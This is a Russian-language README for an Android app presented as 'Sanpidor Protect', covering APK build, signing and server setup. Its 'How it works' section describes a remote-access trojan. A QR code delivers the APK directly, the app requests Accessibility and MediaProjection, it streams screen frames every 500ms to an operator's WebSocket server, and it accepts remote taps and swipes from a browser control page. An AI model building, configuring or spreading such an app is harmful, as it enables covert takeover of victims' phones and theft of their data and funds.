# Sanpidor Protect — Android APK

## Быстрый старт

### 1. Сборка APK

Запусти скрипт-сборщик:

```bash
python build_apk.py
```

APK появится в `apk/sanpidor_protect.apk`

### 2. Требования

- **Python 3.7+** для build_apk.py
- **JDK 17+** для Gradle
- **Android SDK** (опционально, Gradle Wrapper скачает автоматически)

### 3. Ручная сборка (если скрипт не работает)

```bash
cd android_app
./gradlew assembleRelease  # или gradlew.bat на Windows
```

APK: `android_app/app/build/outputs/apk/release/app-release-unsigned.apk`

## Структура проекта

```
ledger/
├── android_app/           # Kotlin проект
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/sanpidor/protect/
│   │   │   │   ├── MainActivity.kt       # UI активации
│   │   │   │   ├── ProtectService.kt     # AccessibilityService + WebSocket
│   │   │   │   └── ProtectApp.kt
│   │   │   ├── res/
│   │   │   │   ├── layout/activity_main.xml
│   │   │   │   ├── values/strings.xml
│   │   │   │   ├── values/themes.xml
│   │   │   │   └── xml/accessibility_config.xml
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle
│   ├── build.gradle
│   ├── settings.gradle
│   └── gradle.properties
├── build_apk.py           # Автоматическая сборка
├── server.py              # VPS сервер (раздача APK + WebSocket)
└── apk/                   # Готовый APK (после сборки)
    └── sanpidor_protect.apk
```

## Как работает

1. **Пользователь сканирует QR** → прямая загрузка APK (без HTML-страницы)
2. **APK запрашивает разрешения** → Accessibility + MediaProjection
3. **WebSocket соединение** → `ws://SERVER:8080/ws/device`
4. **Стрим экрана** → JPEG-кадры каждые 500ms
5. **Управление** → браузер `/control` отправляет tap/swipe

## Настройка сервера

В `ProtectService.kt:46` замени `YOUR_SERVER_IP`:

```kotlin
.url("ws://YOUR_SERVER_IP:8080/ws/device")
```

## Подпись APK (для продакшна)

```bash
# Создать ключ
keytool -genkey -v -keystore release.keystore -alias sanpidor -keyalg RSA -keysize 2048 -validity 10000

# Подписать APK
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore release.keystore app-release-unsigned.apk sanpidor

# Выровнять (опционально)
zipalign -v 4 app-release-unsigned.apk sanpidor_protect.apk
```

## Зависимости

- `androidx.core:core-ktx:1.12.0`
- `androidx.appcompat:appcompat:1.6.1`
- `com.squareup.okhttp3:okhttp:4.12.0` — WebSocket клиент

## Лицензия

Для внутреннего использования.
